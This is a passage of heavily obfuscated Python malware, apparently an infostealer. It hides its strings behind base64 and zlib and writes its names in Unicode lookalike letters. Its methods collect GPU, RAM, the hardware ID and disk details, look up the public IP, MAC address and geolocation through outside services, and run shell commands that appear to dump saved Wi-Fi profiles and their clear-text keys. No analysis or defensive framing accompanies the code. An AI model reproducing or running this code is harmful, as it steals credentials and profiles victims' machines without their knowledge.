        𝗴𝙥𝘂 = 𝘸𝘮𝙞.WMI().Win32_VideoController()[𝙞𝙣𝘁.from_bytes(𝙢𝘢𝙥(lambda O, i: 811 - (𝙞𝙣𝘁(𝙊) + 𝗶), 𝘮𝘢𝘱(__𝘪𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝘱𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝗶𝘁𝙚𝗿(__𝗶𝙢𝗽𝗼𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝙣𝘨𝘦(0)), __𝗶𝘮𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].Name
        𝗿𝗮𝙢 = 𝙧𝘰𝙪𝗻𝙙(𝗳𝘭𝙤𝙖𝘁(𝘄𝘮𝗶.WMI().Win32_OperatingSystem()[𝗶𝗻𝘁.from_bytes(𝙢𝗮𝙥(lambda O, i: 323 - (𝗶𝘯𝘵(𝙊) + 𝙞), 𝘮𝙖𝗽(__𝘪𝗺𝙥𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝗶𝘱(*[𝙞𝘵𝙚𝙧(__𝗶𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝗿𝙖𝘯𝗴𝙚(0)), __𝗶𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)].TotalVisibleMemorySize) / 𝙞𝙣𝘵.from_bytes(𝘮𝘢𝗽(lambda O, i: 901 - (𝙞𝗻𝘵(𝘖) + 𝙞), 𝙢𝘢𝘱(__𝘪𝘮𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝗶𝙩𝘦𝙧(__𝙞𝗺𝘱𝘰𝘳𝙩__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\xf3\x0fq\xac\xf0\x0fq,\xf7wI\xaf\x02\x00\x1a\x0b\x04,')).decode())] * 3)), 𝙧𝘢𝙣𝘨𝗲(3)), __𝙞𝗺𝗽𝙤𝗿𝙩__('base64').b64decode(__𝗶𝘮𝙥𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False), 𝙞𝘯𝘁.from_bytes(𝙢𝘢𝘱(lambda O, i: 809 - (𝙞𝘯𝘁(𝙊) + 𝘪), 𝘮𝙖𝗽(__𝗶𝗺𝙥𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝗶𝘵𝘦𝗿(__𝘪𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝙧𝘢𝙣𝙜𝙚(0)), __𝙞𝙢𝘱𝘰𝘳𝘁__('base64').b64decode(__𝙞𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False))
        𝙝𝙬𝗶𝘥 = 𝘨𝘦𝘵_𝙝𝘸𝘪𝗱()
        return (__𝘪𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝗶𝘮𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0bp)p\tu\x0b5\xf3\rq,\xf7sq\xad\xf2\rI7\xf4\xcd\xf2,\xf7wq4\xf2\xcbJ.\xf7\r1I\x0f5\xce\xa9Jq\x0f+\x01\x00=\x86\x0e\x80')).decode(), __𝘪𝗺𝙥𝙤𝙧𝘁__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0f4t\n\xf3\xcft2O\x0b,\xf0\x08u\x0b5\xf3\xf4(\xb1t\xce\xf1r\n\t\xc9OO56\xf0\x0evK\xf1\nr\x01\xb1\r\xd3#\xdd\x1dm\x01\xae\x1e\x105')).decode().format(𝘤𝗽𝙪, 𝗴𝘱𝘂, 𝙧𝗮𝙢, 𝘩𝘄𝙞𝙙), False)

    def disk_data(self):
        𝗱𝗶𝘀𝙠 = (__𝗶𝙢𝙥𝘰𝘳𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝙞𝘯𝙩.from_bytes(𝗺𝘢𝙥(lambda O, i: 747 - (𝘪𝘯𝙩(𝘖) + 𝗶), 𝙢𝙖𝘱(__𝙞𝙢𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝗽(*[𝙞𝘵𝘦𝙧(__𝘪𝗺𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xab\n\xac\x02\x00\x03\xc6\x01\x94')).decode())] * 3)), 𝘳𝙖𝙣𝗴𝗲(1)), __𝘪𝘮𝘱𝘰𝘳𝘵__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(__𝘪𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x0b\xf2\xf0*H\xc9\r\xb5\x05\x00\x0c:\x02\xb8')).decode(), __𝗶𝗺𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x0b\xca\xf3\xca\x89\n\xb4\xb5\x05\x00\x0c\x84\x02\x9c')).decode(), __𝙞𝙢𝙥𝙤𝘳𝘵__('base64').b64decode(__𝘪𝙢𝘱𝘰𝘳𝘁__('zlib').decompress(b'x\xda\x0bs\xb74\x88\x0c/\xb7\x05\x00\n\x83\x02k')).decode(), __𝘪𝗺𝗽𝗼𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝙩__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcb\xf1\n\xb4\xb5\x05\x00\x0b\xe2\x02~')).decode()) + __𝘪𝘮𝙥𝘰𝙧𝘵__('base64').b64decode(__𝙞𝙢𝗽𝗼𝘳𝘁__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        for 𝙥𝗮𝙧𝘁 in 𝙥𝙨𝙪𝘁𝘪𝘭.disk_partitions(all=False):
            if 𝘰𝙨.name == __𝗶𝘮𝙥𝗼𝘳𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaK\xca\x0b\xb4\x05\x00\x03\xb5\x01_')).decode():
                if __𝗶𝙢𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝘮𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x8b4\n\xaaL22\xb0\x05\x00\x0b2\x02X')).decode() in 𝘱𝙖𝙧𝘁.opts or 𝙥𝗮𝘳𝘁.fstype == __𝘪𝗺𝘱𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode():
                    continue
            𝘶𝘴𝗮𝘨𝘦 = 𝗽𝙨𝘂𝘵𝘪𝘭.disk_usage(𝘱𝘢𝘳𝘁.mountpoint)
            𝗱𝘪𝘴𝗸 += (__𝙞𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝘪𝙢𝗽𝘰𝗿𝘵__('zlib').decompress(b'x\xdaK\xad\xca\xb7\xf0\x8f0H\x07\x00\rC\x02\xc5')).decode() * 𝗶𝙣𝘁.from_bytes(𝘮𝙖𝙥(lambda O, i: 661 - (𝙞𝙣𝘁(𝘖) + 𝙞), 𝗺𝗮𝙥(__𝙞𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝗶𝘵𝘦𝙧(__𝙞𝙢𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝙢𝘱𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcb\n5\x06\x00\x03W\x01A')).decode())] * 3)), 𝗿𝗮𝘯𝗴𝙚(1)), __𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝘪𝘮𝙥𝗼𝘳𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)).format(𝙥𝘢𝘳𝙩.device, 𝘴𝘁𝘳(𝘶𝙨𝙖𝘨𝘦.free // 𝘪𝗻𝙩.from_bytes(𝗺𝙖𝗽(lambda O, i: 526 - (𝙞𝘯𝘁(𝘖) + 𝘪), 𝘮𝘢𝘱(__𝘪𝘮𝗽𝙤𝘳𝙩__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝘪𝗽(*[𝗶𝙩𝙚𝗿(__𝗶𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝙞𝙢𝙥𝗼𝙧𝙩__('zlib').decompress(b'x\xda\xf3\x0b\xf14\x00\x00\x02\xfa\x01\x1c')).decode())] * 3)), 𝙧𝘢𝗻𝙜𝗲(1)), __𝙞𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝘳𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝘪𝗻𝘵.from_bytes(𝗺𝗮𝗽(lambda O, i: 392 - (𝙞𝘯𝘵(𝘖) + 𝗶), 𝘮𝗮𝙥(__𝙞𝗺𝘱𝗼𝗿𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝙥(*[𝘪𝘵𝗲𝘳(__𝗶𝙢𝗽𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xad\x8a\xac\x04\x00\x03\xd1\x01\x9a')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝗲(1)), __𝙞𝗺𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝙞𝗺𝘱𝘰𝙧𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝘴𝙩𝘳(𝘶𝘴𝘢𝗴𝙚.total // 𝗶𝙣𝙩.from_bytes(𝗺𝘢𝗽(lambda O, i: 624 - (𝘪𝘯𝙩(𝗢) + 𝙞), 𝘮𝙖𝙥(__𝙞𝘮𝘱𝘰𝙧𝙩__('base64').b64decode(__𝙞𝙢𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝘱(*[𝙞𝙩𝙚𝗿(__𝗶𝘮𝘱𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xda\xf3\xcb\xf2\xac\x04\x00\x03\x85\x01{')).decode())] * 3)), 𝘳𝙖𝗻𝙜𝗲(1)), __𝙞𝗺𝙥𝗼𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False) ** 𝗶𝘯𝘁.from_bytes(𝘮𝗮𝘱(lambda O, i: 776 - (𝗶𝘯𝘁(𝙊) + 𝙞), 𝘮𝙖𝘱(__𝙞𝗺𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝘪𝗽(*[𝘪𝙩𝘦𝙧(__𝙞𝗺𝗽𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝘱𝗼𝘳𝘵__('zlib').decompress(b'x\xda\xf3\xab\n4\x02\x00\x03~\x01L')).decode())] * 3)), 𝘳𝙖𝘯𝙜𝗲(1)), __𝘪𝗺𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)) + __𝙞𝗺𝙥𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x0b2\xf0\xb4\x05\x00\x02\xab\x01\t')).decode(), 𝘀𝙩𝘳(𝙪𝙨𝗮𝙜𝘦.percent) + __𝗶𝗺𝙥𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xda\xf3\n\xb4\xb5\x05\x00\x02\xd6\x01\x16')).decode()) + __𝙞𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode()
        return (__𝘪𝗺𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3\xcf\x8d*N2v*O\r\xb3\xccN\x8c\xf0+\xf2\xcftr\x05\xd1\x00i\x91\x08h')).decode(), __𝗶𝗺𝙥𝙤𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8btwJO56L\x8ftw\xb4\x05\x00\x18&\x03\x98')).decode().format(𝘥𝘪𝙨𝙠), False)

    def network_data(self):

        def geolocation(ip):
            𝙪𝗿𝘭 = __𝗶𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝙞𝗺𝘱𝙤𝗿𝘁__('zlib').decompress(b'x\xdaK\xf4\x082Hv\xc9/\xf31\xca)\xf7\tw+O\x0c6\xcdJ22(K\xcc\xf3+K\xca\xb44O\x0b\xb4\xb5\x05\x00\xe0\xd4\x0c\x05')).decode().format(𝗶𝘱)
            𝙧𝘦𝘀𝗽𝗼𝘯𝘴𝘦 = 𝗿𝘦𝗾𝘂𝘦𝘀𝘁𝙨.get(𝙪𝗿𝘭, headers={__𝙞𝘮𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝗺𝙥𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x0b\x8b\xf0\xcbI\xce4t\x8a2\n+Mq\xb4\xb5\x05\x00-@\x05\x1e')).decode(): __𝗶𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝘁__('zlib').decompress(b'x\xda\r\xcd\xcb\x0eD0\x14\x00\xd0oR2\x8f\x85\x85G\x0c\xa6mRJ\xcbN#\xb9\xa6*\x11\xe2\xd5\xaf\x1f\x1fpr\xb8x?:q\xaeM\xf9r\xb0\x0e\xe0\x9b\xf4\xb3\x9a\x8a\xbdw\tp\xc3\x80\xf0`#\xf1\n52\x1b\xd5\xec\x99\xa5\x80h4\x02\x93\xe1\xa1>\xb5lE\x8e;\xc9v\xca\x89\x8b5AY4\xe02)(\x8f\x0eP\x1f\xb3\xb4e\x98\xb6\x82.\xea\xba\r\x1a.\x85\x1c\x83\xedx\xde\xd7Fc\xe6\x92\x9fw\x12\xcd\xa0B\xc9\xd4\xc8|\xc6\xb6\xb2\xf4\xf2,\x05\xdf\xff\x03%74\xf8')).decode()})
            𝗱𝙖𝘁𝘢 = 𝙧𝙚𝘀𝘱𝙤𝗻𝘀𝗲.json()
            return (𝙙𝘢𝘁𝘢[__𝘪𝙢𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8b4\xb24L\xca\x0b\xaaL\r\xb4\xb5\x05\x00\x17\xea\x03\xc1')).decode()], 𝙙𝗮𝙩𝗮[__𝗶𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\xce\r\xcbK\x0c\xb7,\r\xc9u+\x89\n\xb4\xb5\x05\x002"\x05\x9b')).decode()], 𝗱𝙖𝘁𝘢[__𝘪𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8b4\xca1H\r\xb4\xb5\x05\x00\n\xe4\x02X')).decode()], 𝗱𝗮𝙩𝙖[__𝘪𝘮𝘱𝘰𝘳𝘁__('base64').b64decode(__𝘪𝗺𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaK\xcd\xcd)\x07\x00\x04.\x01\xb6')).decode()], 𝗱𝘢𝘵𝙖[__𝘪𝘮𝙥𝗼𝗿𝘁__('base64').b64decode(__𝘪𝙢𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\x8b\x8c\xf0\xb5\x05\x00\x03G\x01<')).decode()])
        𝗶𝘱 = 𝘳𝙚𝙦𝙪𝘦𝘴𝘁𝘀.get(__𝗶𝗺𝙥𝙤𝙧𝙩__('base64').b64decode(__𝘪𝙢𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK\xf4\x082H\xf6\xf05\xf3\xa9\xb4\xccHv\xcf.M\x8cp*\x88\xca\xcb.M2\xf6\xca\x03\x00\x86\xb1\t\xaa')).decode()).text
        𝗺𝘢𝗰 = __𝗶𝗺𝗽𝗼𝘳𝘵__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode().join(𝘳𝗲.findall(__𝙞𝗺𝗽𝘰𝗿𝙩__('base64').b64decode(__𝘪𝗺𝙥𝙤𝙧𝙩__('zlib').decompress(b"x\xda\xf3\xc94\xb1\x05\x00\x03\x14\x01'")).decode(), __𝗶𝙢𝗽𝘰𝘳𝘁__('base64').b64decode(__𝗶𝙢𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3\nq\xac\xf0\xcdK\xb7\x05\x00\x0c\x0b\x02\xb7')).decode() % 𝘂𝘂𝘪𝙙.getnode()))
        (𝙘𝙤𝘂𝗻𝘵𝘳𝘺, 𝘳𝙚𝘨𝗶𝗼𝙣, 𝙘𝘪𝘵𝘺, 𝘇𝙞𝘱_, 𝘢𝘴_) = 𝘨𝙚𝘰𝙡𝘰𝙘𝘢𝙩𝙞𝗼𝙣(𝘪𝙥)
        return (__𝗶𝘮𝗽𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝘰𝙧𝘁__('zlib').decompress(b'x\xda\xf3\xcf\xf3\xcbHq\x0f+Nr\xcf1\x88\n\xc9O\x0f\xc9\r3H1\xb2\xacL,\xb7\xb5\x05\x00\x8e\x0c\t\x92')).decode(), __𝗶𝙢𝘱𝙤𝙧𝙩__('base64').b64decode(__𝙞𝗺𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x8btwJ\x0f\x0esL\x0f\x0c\x0f\xcaN\xce\r\xabJ\xae\xcaOO5\xca)O\x0b,\xf0\x0b\x0c\xf5E\x137\xcc\x8846\xf0\x0e4\xb24L\xca\x0b\xaaL\r\x01\x89\xf9\x95\xa5\x84\x9b\x1a$\xe7\xe5X:\xe7x\xe5D\x19\xe5\x94%e\x01\xc5\x8d\xa1\xec<\x90\xfa\x1c\x03\xa8\xda\x82\x14\x8f\x1cKO\xe7\x0c\xf3\xd4\xdc\x9c\xf2\x08c\x83\x02\xe7\xec\x9c\x90P\x17\x90\x9c[U\x84\xb1az\xa4\xbb\xa3-\x00\x17/2\xe3')).decode().format(ip=𝙞𝙥, mac=𝘮𝗮𝙘, country=𝘤𝗼𝘂𝗻𝙩𝗿𝘆, region=𝙧𝙚𝙜𝙞𝗼𝘯, city=𝘤𝙞𝘁𝘆, zip_=𝘻𝘪𝗽_, as_=𝘢𝘀_), False)

    def wifi_data(self):
        (𝘯𝙚𝙩𝘸𝗼𝗿𝘬𝘴, 𝙤𝘶𝘁) = ([], __𝗶𝙢𝙥𝗼𝗿𝙩__('base64').b64decode(__𝗶𝘮𝗽𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())
        try:
            𝘸𝙞𝗳𝗶 = 𝙨𝙪𝙗𝗽𝗿𝙤𝙘𝙚𝙨𝙨.check_output([__𝘪𝙢𝙥𝘰𝗿𝘵__('base64').b64decode(__𝘪𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝘪𝙢𝙥𝘰𝘳𝘁__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝘪𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝗺𝙥𝗼𝙧𝘁__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝗶𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\x8a\xf0\xb5\x05\x00\x1c\xab\x04N')).decode()], shell=True, stdin=𝙨𝘶𝘣𝘱𝗿𝘰𝙘𝗲𝙨𝘀.PIPE, stderr=𝙨𝘶𝘣𝘱𝙧𝗼𝘤𝘦𝘀𝘀.PIPE).decode(__𝘪𝗺𝘱𝘰𝗿𝙩__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝗶𝘮𝗽𝘰𝙧𝘁__('base64').b64decode(__𝙞𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
            𝘄𝙞𝗳𝙞 = [𝗶.split(__𝙞𝗺𝗽𝘰𝘳𝘵__('base64').b64decode(__𝘪𝗺𝘱𝘰𝗿𝘵__('zlib').decompress(b'x\xda\xf3O\xb7\xb5\x05\x00\x03,\x011')).decode())[𝘪𝙣𝘵.from_bytes(𝙢𝙖𝗽(lambda O, i: 477 - (𝗶𝙣𝘵(𝘖) + 𝘪), 𝗺𝘢𝘱(__𝗶𝗺𝙥𝘰𝗿𝘁__('base64').b64decode(__𝘪𝘮𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝗶𝘁𝗲𝗿(__𝗶𝘮𝗽𝙤𝗿𝙩__('base64').b64decode(__𝘪𝙢𝘱𝙤𝗿𝘵__('zlib').decompress(b'x\xda\xf3sI6\x02\x00\x03\x00\x01(')).decode())] * 3)), 𝗿𝙖𝗻𝘨𝙚(1)), __𝗶𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)][𝙞𝗻𝘁.from_bytes(𝗺𝗮𝗽(lambda O, i: 660 - (𝙞𝗻𝙩(𝘖) + 𝙞), 𝗺𝘢𝘱(__𝗶𝙢𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝗶𝙥(*[𝘪𝘁𝘦𝗿(__𝘪𝙢𝘱𝘰𝙧𝘁__('base64').b64decode(__𝙞𝘮𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\xf3\xcb\n5\x05\x00\x03Y\x01C')).decode())] * 3)), 𝘳𝘢𝘯𝗴𝙚(1)), __𝘪𝘮𝘱𝗼𝘳𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝗿𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False):-𝘪𝙣𝙩.from_bytes(𝗺𝙖𝗽(lambda O, i: 436 - (𝗶𝘯𝘵(𝙊) + 𝙞), 𝗺𝗮𝙥(__𝗶𝘮𝘱𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝘪𝙥(*[𝘪𝘵𝗲𝙧(__𝗶𝙢𝘱𝗼𝗿𝘁__('base64').b64decode(__𝗶𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\xf3s\xf15\x04\x00\x02\xd3\x01\x11')).decode())] * 3)), 𝘳𝙖𝗻𝙜𝗲(1)), __𝘪𝗺𝘱𝙤𝘳𝙩__('base64').b64decode(__𝗶𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] for 𝘪 in 𝙬𝙞𝗳𝙞 if __𝙞𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝙢𝙥𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x0b\x0c\xaf(\xf6t\x0b\xab\x8a\x8a\xf0L\x0f\xf5\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00l\x0f\x08}')).decode() in 𝗶]
            for 𝗻𝗮𝗺𝙚 in 𝙬𝗶𝙛𝗶:
                try:
                    𝙧𝗲𝙨𝘂𝗹𝘁𝙨 = 𝘀𝘶𝗯𝙥𝙧𝘰𝙘𝙚𝘀𝘴.check_output([__𝗶𝗺𝗽𝗼𝙧𝙩__('base64').b64decode(__𝗶𝗺𝙥𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\xca\r3H6J\xb7\x05\x00\x0c4\x02\x8f')).decode(), __𝙞𝙢𝘱𝗼𝘳𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK1\xaa\xc8HJ\xb7\xb5\x05\x00\x0c\xd2\x02\xba')).decode(), __𝙞𝙢𝘱𝙤𝘳𝘵__('base64').b64decode(__𝙞𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK6\xca(K)\xb7\xb5\x05\x00\x0c\xe8\x02\xc9')).decode(), __𝙞𝙢𝙥𝙤𝗿𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xdaK\xf6\xf0*\x8b\xca\xcd)\x8e\n\xb4\xb5\x05\x00\x1cv\x047')).decode(), 𝗻𝗮𝗺𝘦, __𝙞𝙢𝘱𝘰𝘳𝙩__('base64').b64decode(__𝘪𝗺𝙥𝘰𝙧𝙩__('zlib').decompress(b'x\xdaK4\n3\r\x08\xf7+\x8e\nw\xab\x04\x00\x18]\x03\xf7')).decode()], shell=True, stdin=𝘴𝘶𝙗𝙥𝘳𝗼𝘤𝗲𝘀𝘀.PIPE, stderr=𝘀𝙪𝘣𝗽𝘳𝗼𝗰𝙚𝘴𝘀.PIPE).decode(__𝗶𝘮𝘱𝘰𝗿𝘵__('base64').b64decode(__𝗶𝘮𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()).split(__𝗶𝗺𝘱𝙤𝗿𝘁__('base64').b64decode(__𝗶𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xdasN\xb7\xb5\x05\x00\x02\xfc\x01%')).decode())
